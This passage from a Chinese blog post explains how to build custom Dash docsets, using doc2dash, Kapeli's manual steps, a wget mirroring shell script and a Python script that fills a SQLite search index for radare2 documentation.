<h3 id="1-5-3-官方工具支持自定义docset"><a href="#1-5-3-官方工具支持自定义docset" class="headerlink" title="1.5.3. 官方工具支持自定义docset"></a>1.5.3. 官方工具支持自定义docset</h3><h4 id="1-5-3-1-doc2dash"><a href="#1-5-3-1-doc2dash" class="headerlink" title="1.5.3.1. doc2dash"></a>1.5.3.1. doc2dash</h4><p>Instructions on generating docsets can be found in the Docset Generation Guide.<br>doc2dash is an MIT-licensed extensible Documentation Set generator intended to be used with the Dash.app API browser for macOS or one of its many free clones for all relevant platforms.<br>If you’ve never heard of Dash.app and its likes, you’re missing out: together with doc2dash it’s all your API documentation at your fingertips – even when you’re offline!<br>doc2dash’s documentation lives at Read the Docs, the code on GitHub. It’s tested on Python 2.7, 3.4+, and PyPy. Both Linux and macOS are tested although certain features are only available on macOS.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd docs &amp;&amp; make html</span><br><span class="line">doc2dash html</span><br></pre></td></tr></table></figure>
<p>一些项目有规范的doc文档，可以用doc2dash 来生成docset.</p>
<h4 id="1-5-3-2-dash-docset-builder"><a href="#1-5-3-2-dash-docset-builder" class="headerlink" title="1.5.3.2. dash-docset-builder"></a>1.5.3.2. dash-docset-builder</h4><p>php写的，功能还是很全，但是不太会调<br><a href="https://github.com/godbout/dash-docset-builder" target="_blank" rel="noopener">https://github.com/godbout/dash-docset-builder</a></p>
<h3 id="1-5-4-官方手动方法自定义docset"><a href="#1-5-4-官方手动方法自定义docset" class="headerlink" title="1.5.4. 官方手动方法自定义docset"></a>1.5.4. 官方手动方法自定义docset</h3><p><a href="https://kapeli.com/docsets#copyDocumentation" target="_blank" rel="noopener">https://kapeli.com/docsets#copyDocumentation</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">13.1. Create the Docset Folder#</span><br><span class="line">The docset folder structure can be created using this Terminal command:</span><br><span class="line"></span><br><span class="line">mkdir -p &lt;docset name&gt;.docset&#x2F;Contents&#x2F;Resources&#x2F;Documents&#x2F;</span><br><span class="line">You can also manually create the docset structure if you want, they&#39;re just folders.</span><br><span class="line"></span><br><span class="line">13.2. Copy the HTML Documentation#</span><br><span class="line">Copy the HTML documentation you already have to this folder:</span><br><span class="line"></span><br><span class="line">&lt;docset name&gt;.docset&#x2F;Contents&#x2F;Resources&#x2F;Documents&#x2F;</span><br><span class="line">13.3. Create the Info.plist File#</span><br><span class="line">Download and edit this sample Info.plist and place it in the &lt;docset name&gt;.docset&#x2F;Contents&#x2F; folder. Editing should be straightforward, just set the values to whatever name you want for your docset.</span><br><span class="line"></span><br><span class="line">13.4. Create the SQLite Index#</span><br><span class="line">Create a SQLite database in the file &lt;docset name&gt;.docset&#x2F;Contents&#x2F;Resources&#x2F;docSet.dsidx with the following query:</span><br><span class="line"></span><br><span class="line">CREATE TABLE searchIndex(id INTEGER PRIMARY KEY, name TEXT, type TEXT, path TEXT);</span><br><span class="line">Recommended: you can easily prevent adding duplicate entries to the index by also using this query:</span><br><span class="line"></span><br><span class="line">CREATE UNIQUE INDEX anchor ON searchIndex (name, type, path);</span><br><span class="line">13.5. Populate the SQLite Index#</span><br><span class="line">You need to create a script (or application or whatever) that will go through your HTML documentation and add appropriate rows into the SQLite database. Rows can be added using this query:</span><br><span class="line"></span><br><span class="line">INSERT OR IGNORE INTO searchIndex(name, type, path) VALUES (&#39;name&#39;, &#39;type&#39;, &#39;path&#39;);</span><br><span class="line">The values are:</span><br><span class="line"></span><br><span class="line">name is the name of the entry. For example, if you are adding a class, it would be the name of the class. This is the column that Dash searches.</span><br><span class="line">type is the type of the entry. For example, if you are adding a class, it would be &quot;Class&quot;. For a list of types that Dash recognises, see below.</span><br><span class="line">path is the relative path towards the documentation file you want Dash to display for this entry. It can contain an anchor (#). Alternatively, Dash also supports http:&#x2F;&#x2F; URL entries.</span><br><span class="line"></span><br><span class="line">You can find a few generation script examples here.</span><br><span class="line">[https:&#x2F;&#x2F;kapeli.com&#x2F;docsets#scriptExamples](https:&#x2F;&#x2F;kapeli.com&#x2F;docsets#scriptExamples)</span><br></pre></td></tr></table></figure>
<h3 id="1-5-5-自定义生成docset"><a href="#1-5-5-自定义生成docset" class="headerlink" title="1.5.5. 自定义生成docset"></a>1.5.5. 自定义生成docset</h3><p>因为别的方法无法具体实现想指定的dash xxx 搜索指令，不能很方便的扩展搜索方式，自己实现可以实现任意html生成dash 的方式</p>
<h4 id="1-5-5-1-获取htm-并生成docset"><a href="#1-5-5-1-获取htm-并生成docset" class="headerlink" title="1.5.5.1. 获取htm,并生成docset"></a>1.5.5.1. 获取htm,并生成docset</h4><p>使用dash 代码片段生成得到指定网页的html,并生成docset格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">wget --recursive \</span><br><span class="line">  --html-extension \</span><br><span class="line">  --convert-links \</span><br><span class="line">  --domains ~_~lldb.llvm.org~_~ \</span><br><span class="line">  --restrict-file-names&#x3D;windows \</span><br><span class="line">  --page-requisites \</span><br><span class="line">  --reject pdf \</span><br><span class="line">  --no-parent ~_~lldb.llvm.org~_~&#x2F;~_~arm~_~.html</span><br><span class="line"></span><br><span class="line">if [ -d &quot;~_~arm~_~.docset&quot; ]; then</span><br><span class="line">    echo &quot;~_~arm~_~.docset exitst, please delete it&quot;</span><br><span class="line">    return</span><br><span class="line">fi</span><br><span class="line">contents&#x3D;~_~arm~_~.docset&#x2F;Contents</span><br><span class="line">res&#x3D;$contents&#x2F;Resources</span><br><span class="line">doc&#x3D;$res&#x2F;Documents</span><br><span class="line">mkdir -p $doc</span><br><span class="line">cp frida.png ~_~arm~_~.docset&#x2F;icon.png</span><br><span class="line">mv ~_~arm~_~.html $doc</span><br><span class="line"></span><br><span class="line">rm $res&#x2F;docSet.dsidx</span><br><span class="line"></span><br><span class="line">cat &gt; $contents&#x2F;Info.plist &lt;&lt;- &quot;EOF&quot;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE plist PUBLIC &quot;-&#x2F;&#x2F;Apple&#x2F;&#x2F;DTD PLIST 1.0&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.apple.com&#x2F;DTDs&#x2F;PropertyList-1.0.dtd&quot;&gt;</span><br><span class="line">&lt;plist version&#x3D;&quot;1.0&quot;&gt;</span><br><span class="line">&lt;dict&gt;</span><br><span class="line">  &lt;key&gt;CFBundleIdentifier&lt;&#x2F;key&gt;</span><br><span class="line">  &lt;string&gt;~_~arm~_~&lt;&#x2F;string&gt;</span><br><span class="line">  &lt;key&gt;CFBundleName&lt;&#x2F;key&gt;</span><br><span class="line">  &lt;string&gt;~_~arm~_~&lt;&#x2F;string&gt;</span><br><span class="line">  &lt;key&gt;DocSetPlatformFamily&lt;&#x2F;key&gt;</span><br><span class="line">  &lt;string&gt;~_~arm~_~&lt;&#x2F;string&gt;</span><br><span class="line">  &lt;key&gt;dashIndexFilePath&lt;&#x2F;key&gt;</span><br><span class="line">  &lt;string&gt;~_~arm~_~.html&lt;&#x2F;string&gt;</span><br><span class="line">  &lt;key&gt;isDashDocset&lt;&#x2F;key&gt;</span><br><span class="line">  &lt;true&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;dict&gt;</span><br><span class="line">&lt;&#x2F;plist&gt;</span><br><span class="line">EOF</span><br><span class="line">echo &#39;done&#39;</span><br></pre></td></tr></table></figure>
<h4 id="1-5-5-2-创建索引"><a href="#1-5-5-2-创建索引" class="headerlink" title="1.5.5.2. 创建索引"></a>1.5.5.2. 创建索引</h4><p>如以下代码创建了 radare2 这个工具的html的docset<br><img src="./pic/355453.png" alt="355453.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sqlite3</span><br><span class="line"></span><br><span class="line">from pathlib import Path</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line"># CREATE TABLE searchIndex(id INTEGER PRIMARY KEY, name TEXT, type TEXT, path TEXT);</span><br><span class="line"># CREATE UNIQUE INDEX anchor ON searchIndex (name, type, path);</span><br><span class="line"># INSERT OR IGNORE INTO searchIndex(name, type, path) VALUES (&#39;Exploit&#39;, &#39;Class&#39;, &#39;index.html&#39;);</span><br><span class="line">respath&#x3D;&quot;~_~arm~_~.docset&#x2F;Contents&#x2F;Resources&quot;</span><br><span class="line">conn &#x3D; sqlite3.connect(&#39;&#123;&#125;&#x2F;docSet.dsidx&#39;.format(respath))</span><br><span class="line">conn.executescript(&#39;&#39;&#39;</span><br><span class="line">    CREATE TABLE IF NOT EXISTS searchIndex(id INTEGER PRIMARY KEY, name TEXT, type TEXT, path TEXT);</span><br><span class="line">    CREATE UNIQUE INDEX IF NOT EXISTS anchor ON searchIndex (name, type, path);&#39;&#39;&#39;)</span><br><span class="line"></span><br><span class="line">def insert(*args):</span><br><span class="line">    conn.execute(&#39;&#39;&#39;INSERT OR IGNORE INTO searchIndex(name, type, path) VALUES (?, ?, ?);&#39;&#39;&#39;, args)</span><br><span class="line"></span><br><span class="line">filename&#x3D;&quot;&#123;&#125;&#x2F;Documents&#x2F;~_~arm~_~.html&quot;.format(respath)</span><br><span class="line">with open(filename) as fp:</span><br><span class="line">    html &#x3D; fp.read()</span><br><span class="line">print(&quot;filename&#x3D;&#123;&#125;&quot;.format(filename))</span><br><span class="line">soup &#x3D; BeautifulSoup(html)</span><br><span class="line"></span><br><span class="line">relpath &#x3D; str(Path(filename).relative_to(&quot;&#123;&#125;&#x2F;Documents&quot;.format(respath)))</span><br><span class="line"></span><br><span class="line"># Rax2 1.12.1</span><br><span class="line"># Rafind2 1.12.2</span><br><span class="line"># Rarun2 1.12.3</span><br><span class="line"># Rabin2 1.12.4</span><br><span class="line"># Radiff2 1.12.5</span><br><span class="line"># Rasm2 1.12.6</span><br><span class="line"># Ragg2 1.12.7</span><br><span class="line"># Rahash2 1.12.8</span><br><span class="line"></span><br><span class="line">type &#x3D; &quot;Method&quot;</span><br><span class="line"></span><br><span class="line">for subtitle in soup.select(&quot;a&quot;):</span><br><span class="line">    if not subtitle:</span><br><span class="line">        break</span><br><span class="line">    if subtitle &#x3D;&#x3D; &quot;\n&quot;:</span><br><span class="line">        continue</span><br><span class="line">    if subtitle.text !&#x3D; &quot;Rax2&quot; and subtitle.text !&#x3D; &quot;Rafind2&quot; and subtitle.text !&#x3D; &quot;Rarun2&quot; \</span><br><span class="line">            and subtitle.text !&#x3D; &quot;Rabin2&quot; and subtitle.text !&#x3D; &quot;Radiff2&quot; and subtitle.text !&#x3D; &quot;Rasm2&quot;\</span><br><span class="line">            and subtitle.text !&#x3D; &quot;Ragg2&quot; and subtitle.text !&#x3D; &quot;Rahash2&quot;:</span><br><span class="line">        continue</span><br><span class="line"></span><br><span class="line">    name &#x3D; subtitle.text</span><br><span class="line">    # path&#x3D;&#39;%s#%s&#39; % (relpath, name)</span><br><span class="line">    path&#x3D;&quot;&#123;&#125;&#123;&#125;&quot;.format(relpath,subtitle[&quot;href&quot;].lower())</span><br><span class="line">    print(&quot;&#123;&#125;\t\t&#123;&#125;\t\t&#123;&#125;&quot;.format(name,type,path))</span><br><span class="line">    insert(name, type, path)</span><br><span class="line"></span><br><span class="line">conn.commit()</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>
<h2 id="1-6-总结"><a href="#1-6-总结" class="headerlink" title="1.6. 总结"></a>1.6. 总结</h2><p>1.遇到问题多看官网，官网有解决办法，不用你老人家瞎琢磨耽误时间<br>2.看文档细心。</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>dash</category>
      </categories>
      <tags>
        <tag>docset</tag>
        <tag>dash</tag>
      </tags>
  </entry>
</search>
